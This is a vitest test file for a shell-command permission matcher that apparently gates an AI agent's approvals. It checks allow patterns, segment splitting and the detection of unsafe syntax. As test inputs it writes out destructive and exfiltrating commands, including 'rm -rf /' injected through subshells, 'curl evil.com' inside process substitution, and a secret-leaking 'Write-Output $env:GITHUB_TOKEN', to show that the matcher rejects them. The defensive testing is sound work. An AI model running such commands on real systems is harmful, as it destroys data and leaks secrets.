import { describe, it, expect } from "vitest";

import type { ApprovalRequest } from "./backend/types";
import {
  matchesAllowPattern,
  matchesDenyPattern,
  allSegmentsMatchAllowPatterns,
  extractPattern,
  extractPatterns,
  getPatternKey,
  getPatternKeys,
  hasDynamicShellExpansion,
  hasWindowsCmdExpansion,
  splitShellSegments,
} from "./permission-patterns";
import {
  normalizeTokenForMatching,
  stripOuterQuotes,
  stripPowerShellBacktickEscapes,
} from "./shell-syntax-permission-utils";

describe("matchesAllowPattern", () => {
  it("matches exact command", () => {
    expect(matchesAllowPattern("npm run build", "npm run build")).toBe(true);
  });

  it("rejects non-matching exact command", () => {
    expect(matchesAllowPattern("npm run test", "npm run build")).toBe(false);
  });

  it("matches wildcard at end", () => {
    expect(matchesAllowPattern('git commit -m "fix bug"', "git commit -m *")).toBe(true);
  });

  it("matches wildcard in middle", () => {
    expect(matchesAllowPattern("python scripts/run.py --verbose", "python * --verbose")).toBe(true);
  });

  it("matches bare wildcard to anything", () => {
    expect(matchesAllowPattern("anything at all", "*")).toBe(true);
  });

  it("rejects partial prefix mismatch", () => {
    expect(matchesAllowPattern("npm run release", "npm run build")).toBe(false);
  });

  it("is case-sensitive", () => {
    expect(matchesAllowPattern("NPM run build", "npm run build")).toBe(false);
  });

  it("matches cat with wildcard path", () => {
    expect(matchesAllowPattern("cat src/components/Header.tsx", "cat *")).toBe(true);
  });

  it("matches example-mcp with wildcard query", () => {
    expect(
      matchesAllowPattern('example-mcp.cmd -q "what are my emails"', "example-mcp.cmd -q *"),
    ).toBe(true);
  });

  it("enforces suffix anchoring for non-trailing wildcards", () => {
    // "npm * --save" should NOT match "npm install foo --save && rm -rf /"
    // (even without compound splitting, the pattern matcher must anchor the suffix)
    expect(matchesAllowPattern("npm install foo --save extra trailing", "npm * --save")).toBe(
      false,
    );
  });

  it("matches when suffix is exact end of command", () => {
    // Glob-anchored suffix — no flags, pure glob path.
    expect(matchesAllowPattern("npm install foo save", "npm * save")).toBe(true);
  });

  it("matches tool: prefix patterns", () => {
    expect(matchesAllowPattern("tool:listEmails", "tool:list*")).toBe(true);
  });

  it("matches mcp: prefix patterns", () => {
    expect(matchesAllowPattern("mcp:filesystem:read", "mcp:filesystem:*")).toBe(true);
  });

  it("rejects mcp: pattern for different server", () => {
    expect(matchesAllowPattern("mcp:playwright:click", "mcp:filesystem:*")).toBe(false);
  });

  it("matches empty strings exactly", () => {
    expect(matchesAllowPattern("", "")).toBe(true);
  });

  it("rejects non-empty command against empty pattern", () => {
    expect(matchesAllowPattern("anything", "")).toBe(false);
  });

  it("rejects empty command against non-empty pattern", () => {
    expect(matchesAllowPattern("", "pattern")).toBe(false);
  });

  it("matches multiple wildcards", () => {
    expect(matchesAllowPattern("npm run build test", "npm * *")).toBe(true);
  });
});

describe("matchesAllowPattern — structured subset matching", () => {
  const stored = "az repos pr list --project * --repository * --status *";

  it("matches when command has a subset of approved flags", () => {
    expect(matchesAllowPattern("az repos pr list --project office", stored)).toBe(true);
  });

  it("matches empty subset (no flags)", () => {
    expect(matchesAllowPattern("az repos pr list", stored)).toBe(true);
  });

  it("rejects when command omits an approved safety flag", () => {
    expect(matchesAllowPattern("npm publish", "npm publish --dry-run")).toBe(false);
  });

  it("matches when command keeps an approved safety flag", () => {
    expect(matchesAllowPattern("npm publish --dry-run", "npm publish --dry-run")).toBe(true);
  });

  it("matches when command has exactly the approved flags", () => {
    expect(
      matchesAllowPattern(
        "az repos pr list --project foo --repository bar --status active",
        stored,
      ),
    ).toBe(true);
  });

  it("rejects when command has a flag NOT in approved set", () => {
    expect(matchesAllowPattern("az repos pr list --project foo --creator me", stored)).toBe(false);
  });

  it("rejects when positional prefix differs", () => {
    expect(matchesAllowPattern("az repos pr create --project foo", stored)).toBe(false);
  });

  it("preserves legacy glob behaviour for non-structured patterns", () => {
    expect(matchesAllowPattern("npm run build", "npm run *")).toBe(true);
    expect(matchesAllowPattern("cat /etc/hosts", "cat *")).toBe(true);
  });

  it("pattern value-glob must match command value", () => {
    expect(matchesAllowPattern("az vm list --name foo", "az vm list --name bar")).toBe(false);
    expect(matchesAllowPattern("az vm list --name foo", "az vm list --name *")).toBe(true);
  });

  it("rejects when command has more positional tokens than pattern", () => {
    expect(matchesAllowPattern("az repos pr list extra --project foo", stored)).toBe(false);
  });

  it("matches --flag=value syntax against --flag=* pattern", () => {
    expect(
      matchesAllowPattern("npm install --save-dev=true lodash", "npm install --save-dev=* *"),
    ).toBe(true);
  });

  it("handles boolean flag in pattern (null value) with boolean command flag", () => {
    expect(matchesAllowPattern("az login --use-device-code", "az login --use-device-code")).toBe(
      true,
    );
  });

  it("rejects when pattern expects a value but command omits it (boolean form)", () => {
    // Pattern has `--project *` (needs value), command has bare `--project` (boolean) → reject.
    expect(matchesAllowPattern("az repos pr list --project", stored)).toBe(false);
  });

  it("repeated flags in the command match a single flag in the pattern (each value checked)", () => {
    // new Map(pat.flags.map(...)) dedupes pattern flag names; repeated
    // command flags are each checked against the same pattern entry.
    // Intentional behaviour for CLIs that accept multi-valued flags like
    // grep -e foo -e bar.
    expect(matchesAllowPattern("grep -e foo -e bar", "grep -e *")).toBe(true);
  });

  it("does not fall back to glob when the structured subset check rejects an unknown flag", () => {
    // Glob would have accepted the command via `*` absorbing --evil; structured
    // semantics must reject because --evil isn't in the approved flag set.
    expect(
      matchesAllowPattern(
        "az repos list --project foo --evil bar",
        "az repos list --project * --repository *",
      ),
    ).toBe(false);
  });
});

describe("allSegmentsMatchAllowPatterns", () => {
  const patterns = ["cat *", "head *", "npm run build"];

  it("approves single command matching a pattern", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo.txt", patterns)).toBe(true);
  });

  it("approves piped command when each segment matches a stored pattern", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo.txt | head -5", patterns)).toBe(true);
  });

  it("approves piped command when a matching compound pattern is stored", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo.txt | head -5", ["cat * | head *"])).toBe(true);
  });

  it("rejects piped command where one segment has no match", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo.txt | rm -rf /", patterns)).toBe(false);
  });

  it("rejects compound command with && where one segment has no match", () => {
    expect(allSegmentsMatchAllowPatterns("npm run build && rm -rf /", patterns)).toBe(false);
  });

  it("approves exact match with no operators", () => {
    expect(allSegmentsMatchAllowPatterns("npm run build", patterns)).toBe(true);
  });

  it("approves semicolon compound when each segment matches a stored pattern", () => {
    expect(allSegmentsMatchAllowPatterns("cat a.txt ; head b.txt", patterns)).toBe(true);
  });

  it("approves semicolon compound with a matching compound pattern", () => {
    expect(allSegmentsMatchAllowPatterns("cat a.txt ; head b.txt", ["cat * ; head *"])).toBe(true);
  });

  it("approves repeated chained commands from one command pattern", () => {
    expect(allSegmentsMatchAllowPatterns("gh pr view 100; gh pr view 101", ["gh pr view *"])).toBe(
      true,
    );
  });

  it("approves commands separated by newlines", () => {
    expect(allSegmentsMatchAllowPatterns("gh pr view 100\ngh pr view 101", ["gh pr view *"])).toBe(
      true,
    );
  });

  it("rejects newline injection through a broad allow pattern", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo\nrm -rf /", ["cat *"])).toBe(false);
  });

  it("expands previously persisted compound allow patterns", () => {
    expect(
      allSegmentsMatchAllowPatterns("gh pr view 100; gh pr view 101", [
        "gh pr view *; gh pr view *",
      ]),
    ).toBe(true);
  });

  it("does not split operators inside quoted strings", () => {
    const command = "python -c \"import json; print('ok')\"";
    expect(allSegmentsMatchAllowPatterns(command, [command])).toBe(true);
  });

  it("does not split newlines inside quoted strings", () => {
    const command = "python -c \"import json\nprint('ok')\"";
    expect(allSegmentsMatchAllowPatterns(command, [command])).toBe(true);
  });

  it("returns false for empty patterns list", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo.txt", [])).toBe(false);
  });

  it("rejects redirect operator (security-critical)", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo.txt > /etc/passwd", ["cat *"])).toBe(false);
  });

  it("rejects append redirect", () => {
    expect(allSegmentsMatchAllowPatterns("cat foo.txt >> output.txt", ["cat *"])).toBe(false);
  });

  it("rejects input redirect", () => {
    expect(allSegmentsMatchAllowPatterns("cat < secret.txt", ["cat *"])).toBe(false);
  });

  it("approves an exact command containing redirection", () => {
    const command = "python script.py > output.txt";
    expect(allSegmentsMatchAllowPatterns(command, [command])).toBe(true);
  });

  it("rejects backtick subshell injection (bash)", () => {
    // Bash-specific: in PowerShell ` is an escape character. Explicit shellMode
    // keeps the assertion stable regardless of CI host.
    expect(allSegmentsMatchAllowPatterns("cat `rm -rf /`", patterns, "bash")).toBe(false);
  });

  it("rejects $() subshell injection", () => {
    expect(allSegmentsMatchAllowPatterns("cat $(rm -rf /)", patterns)).toBe(false);
  });

  it("rejects PowerShell array subexpression injection", () => {
    expect(
      allSegmentsMatchAllowPatterns("Get-ChildItem @(Remove-Item .\\important.txt)", [
        "Get-ChildItem *",
      ]),
    ).toBe(false);
  });

  it("rejects PowerShell parenthesized command expression injection (bash)", () => {
    // In bash, `(...)` is a subshell — rejection comes from `hasUnsafeSyntax`.
    expect(
      allSegmentsMatchAllowPatterns(
        "Write-Output (Remove-Item .\\important.txt)",
        ["Write-Output *"],
        "bash",
      ),
    ).toBe(false);
  });

  it("rejects same shape in PowerShell mode (destructive cmdlet inside scriptblock)", () => {
    // In PowerShell, `(...)` is a sub-expression boundary — `Remove-Item`
    // splits out as its own segment and fails the per-segment pattern check
    // because `Remove-Item *` isn't allowed. Documents that the rejection
    // cause differs between shells (subshell guard vs cmdlet mismatch).
    expect(
      allSegmentsMatchAllowPatterns(
        "Write-Output (Remove-Item .\\important.txt)",
        ["Write-Output *"],
        "powershell",
      ),
    ).toBe(false);
  });

  it("rejects PowerShell script block injection (bash)", () => {
    expect(
      allSegmentsMatchAllowPatterns("where { Remove-Item .\\important.txt }", ["where *"], "bash"),
    ).toBe(false);
  });

  it("rejects PowerShell scriptblock with destructive cmdlet (powershell)", () => {
    expect(
      allSegmentsMatchAllowPatterns(
        "where { Remove-Item .\\important.txt }",
        ["where *"],
        "powershell",
      ),
    ).toBe(false);
  });

  it("rejects broad patterns for quoted subshell syntax", () => {
    expect(allSegmentsMatchAllowPatterns('echo "$(rm -rf /)"', ["echo *"])).toBe(false);
  });

  it("rejects leading PowerShell call operator under broad patterns", () => {
    expect(
      allSegmentsMatchAllowPatterns("& powershell.exe -EncodedCommand abc", ["powershell.exe *"]),
    ).toBe(false);
  });

  it("honors exact consent for unsafe subshell syntax", () => {
    // Exact approvals represent explicit consent to this literal command; broad patterns do not.
    const command = "echo $(rm -rf /)";
    expect(allSegmentsMatchAllowPatterns(command, [command])).toBe(true);
  });

  it.each([
    "echo $TOKEN",
    "echo ${TOKEN}",
    "echo $env:TOKEN",
    "echo %TOKEN%",
    "echo !TOKEN!",
    'echo "$TOKEN"',
  ])("rejects dynamic variable expansion under broad patterns: %s", (command) => {
    expect(allSegmentsMatchAllowPatterns(command, ["echo *"])).toBe(false);
  });

  it.each(["echo %PAYLOAD%", "echo !PAYLOAD!"])(
    "rejects Windows cmd expansion even for exact stored approvals: %s",
    (command) => {
      expect(allSegmentsMatchAllowPatterns(command, [command])).toBe(false);
    },
  );

  it("approves an exact command containing PowerShell interpolation", () => {
    const command = '$c = @{ runCount = 1 }; "runCount=$($c.runCount)"';
    expect(allSegmentsMatchAllowPatterns(command, [command])).toBe(true);
  });

  it("rejects process substitution <()", () => {
    expect(allSegmentsMatchAllowPatterns("cat <(curl evil.com)", patterns)).toBe(false);
  });

  it("rejects output process substitution >()", () => {
    expect(allSegmentsMatchAllowPatterns("tee >(curl evil.com)", patterns)).toBe(false);
  });

  it("rejects heredoc <<", () => {
    expect(allSegmentsMatchAllowPatterns("cat << EOF", patterns)).toBe(false);
  });

  it("approves mixed-operator compound when each segment matches a stored pattern", () => {
    const mixedPatterns = ["cat *", "head *", "grep *", "echo *"];
    expect(
      allSegmentsMatchAllowPatterns("cat a.txt | head -5 && grep x ; echo done", mixedPatterns),
    ).toBe(true);
  });

  it("approves mixed-operator compound with a matching compound pattern", () => {
    expect(
      allSegmentsMatchAllowPatterns("cat a.txt | head -5 && grep x ; echo done", [
        "cat * | head * && grep * ; echo *",
      ]),
    ).toBe(true);
  });
});

describe("hasDynamicShellExpansion", () => {
  it.each(["$VAR", "${VAR}", "$env:TOKEN", "$?", "$$", "$!"])(
    "detects dynamic shell expansion: %s",
    (command) => {
      expect(hasDynamicShellExpansion(command)).toBe(true);
    },
  );

  it("does not flag a trailing dollar sign", () => {
    expect(hasDynamicShellExpansion("echo cost is 100$")).toBe(false);
  });
});

describe("hasWindowsCmdExpansion", () => {
  it.each(["%VAR%", "!VAR!", "%PATH:~0,5%"])("detects Windows cmd expansion: %s", (command) => {
    expect(hasWindowsCmdExpansion(command)).toBe(true);
  });

  it("does not flag non-variable percent text", () => {
    expect(hasWindowsCmdExpansion("echo 100%")).toBe(false);
  });
});

describe("extractPattern", () => {
  it("strips quoted strings to wildcard", () => {
    expect(extractPattern('example-mcp.cmd -q "what are my emails"')).toBe("example-mcp.cmd -q *");
  });

  it("keeps exact subcommands", () => {
    expect(extractPattern("npm run build")).toBe("npm run build");
  });

  it("strips quoted commit message", () => {
    expect(extractPattern('git commit -m "fix login bug"')).toBe("git commit -m *");
  });

  it("strips file paths to wildcard", () => {
    expect(extractPattern("cat src/components/Header.tsx")).toBe("cat *");
  });

  it("strips relative paths", () => {
    expect(extractPattern("cat ./README.md")).toBe("cat *");
  });

  it("strips home-relative paths", () => {
    expect(extractPattern("cat ~/documents/file.txt")).toBe("cat *");
  });

  it("strips Windows-style paths", () => {
    expect(extractPattern("cat C:\\Users\\foo\\file.txt")).toBe("cat *");
  });

  it("strips shell variables ($VAR)", () => {
    expect(extractPattern("Get-ChildItem -Force $HOME")).toBe("Get-ChildItem -Force *");
  });

  it("strips ${VAR} syntax (bash)", () => {
    // PowerShell sees `{` as scriptblock start, which would split the segment.
    expect(extractPattern("echo ${USER}", "bash")).toBe("echo *");
  });

  it("strips $env:VAR PowerShell variables", () => {
    expect(extractPattern("Get-ChildItem $env:USERPROFILE")).toBe("Get-ChildItem *");
  });

  it("collapses consecutive wildcards", () => {
    expect(extractPattern('python ./script.py "arg"')).toBe("python *");
  });

  it("keeps flags without variable content", () => {
    expect(extractPattern("ls -la")).toBe("ls -la");
  });

  it("strips single-quoted strings", () => {
    expect(extractPattern("echo 'hello world'")).toBe("echo *");
  });

  it("returns empty string for empty input", () => {
    expect(extractPattern("")).toBe("");
  });

  it("returns single token unchanged", () => {
    expect(extractPattern("ls")).toBe("ls");
  });
});

describe("extractPatterns", () => {
  it("extracts per-segment patterns for compound commands", () => {
    expect(extractPatterns("cat src/a.txt; head logs/b.txt")).toEqual(["cat *", "head *"]);
  });

  it("deduplicates repeated commands that generalize to the same pattern", () => {
    expect(extractPatterns("gh pr view 100; gh pr view 101")).toEqual(["gh pr view *"]);
  });

  it("keeps exact command for unsafe shell syntax", () => {
    expect(extractPatterns("python script.py > output.txt")).toEqual([
      "python script.py > output.txt",
    ]);
  });
});

describe("splitShellSegments", () => {
  it("splits CRLF and trailing single ampersand operators", () => {
    expect(splitShellSegments("cat a\r\nhead b & echo done")).toMatchObject({
      segments: ["cat a", "head b", "echo done"],
      operators: [";", "&"],
      hasUnsafeSyntax: false,
    });
  });

  it("keeps shell operators inside quoted and ANSI-C quoted strings", () => {
    expect(splitShellSegments("printf $'a;b' && echo \"c && d\"")).toMatchObject({
      segments: ["printf $'a;b'", 'echo "c && d"'],
      operators: ["&&"],
      hasUnsafeSyntax: false,
    });
  });

  it("keeps unclosed quoted content in one segment", () => {
    expect(splitShellSegments('python -c "print(1);\nprint(2)')).toMatchObject({
      segments: ['python -c "print(1);\nprint(2)'],
      operators: [],
      hasUnsafeSyntax: false,
    });
  });

  it("marks plain input redirection unsafe", () => {
    expect(splitShellSegments("cat < secret.txt")).toMatchObject({
      segments: ["cat < secret.txt"],
      operators: [],
      hasUnsafeSyntax: true,
    });
  });

  it("marks leading PowerShell call operator unsafe", () => {
    expect(splitShellSegments("& powershell.exe -EncodedCommand abc")).toMatchObject({
      segments: ["powershell.exe -EncodedCommand abc"],
      operators: [],
      hasUnsafeSyntax: true,
    });
  });
});

describe("extractPattern — flag-value generalization", () => {
  it("generalizes values after --long-flag", () => {
    expect(extractPattern("az repos list --project office --repository 1js")).toBe(
      "az repos list --project * --repository *",
    );
  });

  it("generalizes value after -short-flag", () => {
    expect(extractPattern("grep -n needle somefile")).toBe("grep -n * *");
  });

  it("keeps boolean flags literal when next token is another flag", () => {
    expect(extractPattern("ls -la --color=auto")).toBe("ls -la --color=*");
  });

  it("handles --flag=value syntax", () => {
    expect(extractPattern("npm install --save-dev=true lodash")).toBe("npm install --save-dev=* *");
  });

  it("does not generalize positional tokens before first flag", () => {
    expect(extractPattern("kubectl get pods --namespace foo")).toBe(
      "kubectl get pods --namespace *",
    );
  });

  it("leaves terminal boolean flag literal (no value after)", () => {
    expect(extractPattern("az login --use-device-code")).toBe("az login --use-device-code");
  });

  it("keeps literals for commands with no flags", () => {
    expect(extractPattern("git status")).toBe("git status");
  });

  it("generalizes bare numeric positional args (head -20, sleep 5)", () => {
    // -20 isn't a flag (no letter after `-`); digit-only tokens are
    // almost always user-supplied counts and safer as *.
    expect(extractPattern("head -20")).toBe("head *");
    expect(extractPattern("sleep 5")).toBe("sleep *");
  });

  it("leaves bare `--` literal (not a flag per isFlagToken rule)", () => {
    // `--` has no letter after the dashes so isFlagToken is false; stays
    // positional literal. Subsequent tokens follow existing positional rules
    // (path-like → *, literal otherwise).
    expect(extractPattern("git log -- ./README.md")).toBe("git log -- *");
    expect(extractPattern("git log -- README")).toBe("git log -- README");
  });

  it("strips `$var = ` prefix before extracting (RHS is the command)", () => {
    expect(extractPattern("$logs = Get-ChildItem C:\\temp\\logs")).toBe("Get-ChildItem *");
    expect(extractPattern("$x = ls -la")).toBe("ls -la");
  });

  it("strips `$var = ` prefix per segment in compound commands", () => {
    expect(extractPattern("$content = Get-Content ./foo.log | Select-String 'bar'")).toBe(
      "Get-Content * | Select-String *",
    );
  });

  it("handles --flag=value where value itself contains `=`", () => {
    expect(extractPattern("docker run --env=KEY=VAL image")).toBe("docker run --env=* *");
    expect(extractPattern("git log --filter=blob:none")).toBe("git log --filter=*");
  });
});

describe("getPatternKey", () => {
  // eslint-disable-next-line @typescript-eslint/no-unsafe-type-assertion -- test shims; typed fields match normalized types
  const req = (obj: unknown) => obj as ApprovalRequest;

  it("returns shell pattern for shell kind", () => {
    expect(getPatternKey(req({ kind: "shell", command: 'git commit -m "fix"' }))).toBe(
      "git commit -m *",
    );
  });

  it("returns shell pattern from command field", () => {
    expect(getPatternKey(req({ kind: "shell", command: "npm run build" }))).toBe("npm run build");
  });

  it("returns pattern keys for shell kind", () => {
    expect(getPatternKeys(req({ kind: "shell", command: "cat src/file.txt" }))).toEqual(["cat *"]);
  });

  it("returns individual per-segment keys for shell kind", () => {
    expect(
      getPatternKeys(req({ kind: "shell", command: "cat src/a.txt; head logs/b.txt" })),
    ).toEqual(["cat *", "head *"]);
  });

  it("returns joined per-segment patterns for compound shell commands", () => {
    expect(getPatternKey(req({ kind: "shell", command: "cat src/a.txt; head logs/b.txt" }))).toBe(
      "cat *; head *",
    );
  });

  it("returns tool: prefix for custom-tool kind", () => {
    expect(getPatternKey(req({ kind: "custom-tool", toolName: "listEmails" }))).toBe(
      "tool:listEmails",
    );
  });

  it("returns mcp: prefix for mcp kind", () => {
    expect(getPatternKey(req({ kind: "mcp", serverName: "filesystem", toolName: "read" }))).toBe(
      "mcp:filesystem:read",
    );
  });

  it("returns write: prefix for write kind", () => {
    expect(getPatternKey(req({ kind: "write", path: "src/index.ts" }))).toBe("write:src/index.ts");
  });

  it("returns url: prefix for url kind", () => {
    expect(getPatternKey(req({ kind: "url", url: "https://api.example.com/data" }))).toBe(
      "url:https://api.example.com/data",
    );
  });

  it("returns ['tool:read'] for read kind", () => {
    expect(getPatternKey(req({ kind: "read" }))).toBe("tool:read");
  });

  it("returns null for shell kind with empty command", () => {
    expect(getPatternKey(req({ kind: "shell", command: "" }))).toBeNull();
  });

  it("returns null for custom-tool with no toolName", () => {
    expect(getPatternKey(req({ kind: "custom-tool", toolName: "" }))).toBeNull();
  });

  it("returns null for custom-tool with empty string toolName", () => {
    expect(getPatternKey(req({ kind: "custom-tool", toolName: "" }))).toBeNull();
  });

  it("returns null for mcp with empty string toolName", () => {
    expect(getPatternKey(req({ kind: "mcp", serverName: "fs", toolName: "" }))).toBeNull();
  });

  it("normalizes backslashes to forward slashes for write kind", () => {
    expect(getPatternKey(req({ kind: "write", path: "C:\\Users\\alice\\file.md" }))).toBe(
      "write:c:/users/alice/file.md",
    );
  });

  it("normalizes to lowercase on Windows for write kind", () => {
    expect(getPatternKey(req({ kind: "write", path: "C:/Users/Alice/Documents/File.md" }))).toBe(
      "write:c:/users/alice/documents/file.md",
    );
  });
});

describe("allSegmentsMatchAllowPatterns — compound pattern support", () => {
  it("matches compound command against compound pattern with same topology", () => {
    const patterns = ["git log * | head *"];
    expect(allSegmentsMatchAllowPatterns("git log --oneline | head -20", patterns)).toBe(true);
  });

  it("rejects when any command segment has no matching pattern", () => {
    const patterns = ["git log * | head *"];
    expect(allSegmentsMatchAllowPatterns("git log | head | cat", patterns)).toBe(false);
    expect(allSegmentsMatchAllowPatterns("git log", patterns)).toBe(false);
  });

  it("approves multi-segment command when each segment matches a stored pattern", () => {
    const patterns = ["git log *", "head *"];
    expect(allSegmentsMatchAllowPatterns("git log --oneline | head -20", patterns)).toBe(true);
  });

  it("prefers compound pattern when one is present (same command matches either)", () => {
    const patterns = ["git log * | head *", "unrelated *"];
    expect(allSegmentsMatchAllowPatterns("git log --oneline | head -20", patterns)).toBe(true);
  });

  it("compound pattern still rejects subshell in the command", () => {
    const patterns = ["cat * | grep *"];
    expect(allSegmentsMatchAllowPatterns("cat $(rm -rf /) | grep foo", patterns)).toBe(false);
  });

  it("approves when operator type differs but each segment matches", () => {
    // Operator topology is no longer the consent boundary; every stored
    // segment is independently guardrail-vetted before it can authorize a
    // future compound command.
    expect(allSegmentsMatchAllowPatterns("cat foo ; head bar", ["cat * | head *"])).toBe(true);
  });
});

describe("extractPattern — compound commands", () => {
  it("generalizes each segment and preserves the operator", () => {
    expect(extractPattern("git log --oneline | head -20")).toBe("git log --oneline | head *");
  });

  it("preserves operator kind (|| vs | vs ;)", () => {
    expect(extractPattern("ls ~/foo ; ls ~/bar")).toBe("ls * ; ls *");
  });

  it("keeps whole command for subshell commands (guardrail nulls upstream)", () => {
    // Don't try to generalize subshell text; guardrail G_COMPOUND rejects.
    expect(extractPattern("echo $(pwd)")).toBe("echo $(pwd)");
  });
});

// PowerShell-mode coverage. The shell parser must recognize ``\\``\\` `` as an
// escape (not a bash subshell), `(...)` as a sub-expression, and `{...}` as a
// scriptblock — all of which were previously flagged unsafe and silently
// killed pattern matching plus read-only auto-approve on Windows.
describe("splitShellSegments — PowerShell mode", () => {
  it("treats `` ` `` as escape, not subshell (no unsafe flag)", () => {
    const r = splitShellSegments("echo `$expand=relations", "powershell");
    expect(r.hasUnsafeSyntax).toBe(false);
    expect(r.segments).toEqual(["echo `$expand=relations"]);
  });

  it("escapes inside double-quoted strings too", () => {
    const r = splitShellSegments('echo "`$var stays literal"', "powershell");
    expect(r.hasUnsafeSyntax).toBe(false);
  });

  it("strips `` `\\n `` line-continuation so multi-line commands tokenize cleanly", () => {
    // Without this, `` ` `` + `\n` would leave a bare `` ` `` token in the
    // segment after tokenize splits on whitespace — defeating structured-flag
    // matching of multi-line PowerShell commands the model commonly emits.
    const r = splitShellSegments("Get-ChildItem `\n  -Recurse `\n  -Force", "powershell");
    expect(r.hasUnsafeSyntax).toBe(false);
    expect(r.segments).toEqual(["Get-ChildItem   -Recurse   -Force"]);
  });

  it("multi-line `az devops invoke` line-continuation tokenizes without stray backticks", () => {
    const cmd =
      "az devops invoke `\n  --organization https://example.com `\n  --area wit `\n  --output json";
    const seg = splitShellSegments(cmd, "powershell").segments[0];
    // Tokens should be flat — no `` ` `` standalone token.
    expect(seg.split(/\s+/).filter(Boolean)).not.toContain("`");
  });

  it("splits on parens (sub-expression boundary, not subshell)", () => {
    const r = splitShellSegments('if (Test-Path "X") { Get-ChildItem }', "powershell");
    expect(r.hasUnsafeSyntax).toBe(false);
    expect(r.segments).toEqual(["if", 'Test-Path "X"', "Get-ChildItem"]);
  });

  it("splits on scriptblock braces (not bash brace expansion)", () => {
    const r = splitShellSegments(
      "if ($x) { Get-Content foo } else { Get-Content bar }",
      "powershell",
    );
    expect(r.hasUnsafeSyntax).toBe(false);
    expect(r.segments).toContain("Get-Content foo");
    expect(r.segments).toContain("Get-Content bar");
  });

  it("still flags `$()` command substitution as unsafe (PowerShell sub-expression invocation)", () => {
    expect(splitShellSegments("echo $(curl evil)", "powershell").hasUnsafeSyntax).toBe(true);
  });

  it("still flags `<` / `>` redirection as unsafe in PowerShell mode", () => {
    expect(splitShellSegments("Get-Content > out.txt", "powershell").hasUnsafeSyntax).toBe(true);
    expect(splitShellSegments("Get-Content < in.txt", "powershell").hasUnsafeSyntax).toBe(true);
  });

  it("still flags heredoc-like `<<` as unsafe", () => {
    expect(splitShellSegments("foo <<EOF", "powershell").hasUnsafeSyntax).toBe(true);
  });

  it("still flags `@()` array-from-expression evaluation as unsafe", () => {
    // @( ... ) creates an array but the parens evaluate arbitrary code;
    // pre-existing posture is conservative — leave it unsafe.
    expect(splitShellSegments("$x = @(Get-ChildItem)", "powershell").hasUnsafeSyntax).toBe(true);
  });

  it("bash mode is unchanged: backtick still triggers unsafe", () => {
    expect(splitShellSegments("echo `whoami`", "bash").hasUnsafeSyntax).toBe(true);
  });

  it("bash mode is unchanged: parens still trigger unsafe", () => {
    expect(splitShellSegments("(ls)", "bash").hasUnsafeSyntax).toBe(true);
  });
});

describe("hasDynamicShellExpansion — quote awareness", () => {
  it("does NOT flag `$X` inside single quotes (bash + PS both treat it as literal)", () => {
    // Both bash and PowerShell prevent variable expansion inside `'...'`.
    // The shell passes the literal string `$TOKEN` to the program; no
    // environment lookup happens. So this MUST NOT count as dynamic.
    expect(hasDynamicShellExpansion("echo '$TOKEN'", "bash")).toBe(false);
    expect(hasDynamicShellExpansion("echo '$TOKEN'", "powershell")).toBe(false);
    expect(hasDynamicShellExpansion("echo '$env:USERPROFILE'", "powershell")).toBe(false);
  });

  it("STILL flags `$X` inside double quotes (variable expansion still happens)", () => {
    // Double quotes do NOT prevent expansion in either shell. The program
    // receives the expanded value at runtime, so this stays dynamic.
    expect(hasDynamicShellExpansion('echo "$TOKEN"', "bash")).toBe(true);
    expect(hasDynamicShellExpansion('echo "$TOKEN"', "powershell")).toBe(true);
  });

  it("STILL flags bare `$X` outside any quotes", () => {
    expect(hasDynamicShellExpansion("echo $TOKEN", "bash")).toBe(true);
    expect(hasDynamicShellExpansion("echo $TOKEN", "powershell")).toBe(true);
  });

  it("handles mixed-quoting in one command (single-quoted safe, double-quoted dynamic)", () => {
    // The single-quoted `$LITERAL` is safe, but the double-quoted `$LIVE`
    // expands at runtime → command is dynamic overall.
    expect(hasDynamicShellExpansion("echo '$LITERAL' \"$LIVE\"", "bash")).toBe(true);
    // Inverse: only single-quoted variable → safe.
    expect(hasDynamicShellExpansion("echo 'a$LITERAL' 'b$ALSO_LITERAL'", "bash")).toBe(false);
  });

  it("STILL flags `$(...)` inside double quotes (subshell)", () => {
    expect(hasDynamicShellExpansion('echo "$(curl evil)"', "bash")).toBe(true);
    expect(hasDynamicShellExpansion('echo "$(curl evil)"', "powershell")).toBe(true);
  });

  it("does NOT flag `$(...)` inside single quotes (literal — bash/PS don't evaluate)", () => {
    // Edge case but worth pinning: $() inside single quotes is literal too.
    // In practice splitShellSegments may still treat the LITERAL outside
    // tokenization as unsafe-looking, but at the dynamic-expansion layer
    // alone, single-quoted text is inert.
    expect(hasDynamicShellExpansion("echo '$(curl evil)'", "bash")).toBe(false);
    expect(hasDynamicShellExpansion("echo '$(curl evil)'", "powershell")).toBe(false);
  });
});

describe("hasDynamicShellExpansion — PowerShell mode", () => {
  it("treats `` `$word `` as literal (escaped dollar)", () => {
    expect(hasDynamicShellExpansion("echo `$expand=relations", "powershell")).toBe(false);
  });

  it("still flags bare `$word` as dynamic (variable contents are policy-opaque)", () => {
    // SECURITY: PowerShell `$var` is treated as dynamic in both shells. This
    // mirrors the bash posture — variable contents are unknown at policy
    // eval time and are the same leak/injection vector either way (e.g.
    // `Write-Output $env:GITHUB_TOKEN` exfiltrates a secret). The
    // `step 7: broad shell allow does not cover dynamic variable expansion`
    // regression test enforces this on the allow-pattern path. The ONLY
    // PowerShell-specific relaxation is the `` `$ `` escape (above).
    expect(hasDynamicShellExpansion("echo $foo", "powershell")).toBe(true);
    expect(hasDynamicShellExpansion("Get-Content $env:USERPROFILE", "powershell")).toBe(true);
  });

  it("still flags `$(` as dynamic (sub-expression invocation)", () => {
    expect(hasDynamicShellExpansion("echo $(curl evil)", "powershell")).toBe(true);
  });

  it("bash mode is unchanged: `` `$ `` is dynamic (no escape semantics)", () => {
    expect(hasDynamicShellExpansion("echo `$expand", "bash")).toBe(true);
  });
});

describe("allSegmentsMatchAllowPatterns — PowerShell mode (Issue 1 regression)", () => {
  // The original bug report: a user's allow pattern using PowerShell escape
  // syntax (`` `$expand=* ``) was silently ignored because the bash unsafe
  // gate fired on both the pattern AND the command.
  const allowPattern =
    "az devops invoke --organization https://tracker.example.com/teamDivision --area wit --resource workItems --route-parameters project=Engineering --query-parameters ids=* fields=* `$expand=* --api-version * --output json";
  const command =
